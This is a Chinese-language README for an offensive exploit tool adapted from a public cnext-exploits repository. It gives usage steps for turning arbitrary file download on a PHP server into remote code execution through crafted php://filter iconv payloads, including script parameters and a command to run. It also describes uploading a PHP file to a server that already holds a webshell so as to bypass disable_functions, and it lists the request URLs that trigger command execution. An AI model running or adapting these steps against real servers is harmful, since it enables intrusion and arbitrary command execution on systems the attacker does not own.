# php-filter-iconv
修改自
https://github.com/ambionics/cnext-exploits

## php-filter-iconv.py用法
通过任意文件下载获取目标的/proc/self/maps和libc-2.x.so，在本机和php-filter-iconv.py放在同目录，然后运行脚本即可生成php://filter/的RCE payload，详细参数调整如下代码即可。
```
.......
maps_path = './maps'
cmd = 'echo 123 > 1.txt'
sleep_time = 1
padding = 20

if not os.path.exists(maps_path):
    exit("[-]no maps file")

regions = get_regions(maps_path)
heap, libc_info = get_symbols_and_addresses(regions)

libc_path = libc_info.path
print("[*]download: "+libc_path)

libc_path = './libc-2.23.so'
.......
```

## php-filter-iconv.php用法

直接上传到已经获得webshell的服务器进行bypass disable_functions，然后访问如下链接检测环境

/php-filter-iconv.php?cmd=curl 127.0.0.1:8888&run=0

然后访问如下链接进行命令执行，一切顺利命令会执行成功，服务器会延时几分钟报503

/php-filter-iconv.php?cmd=curl 127.0.0.1:8888&run=1

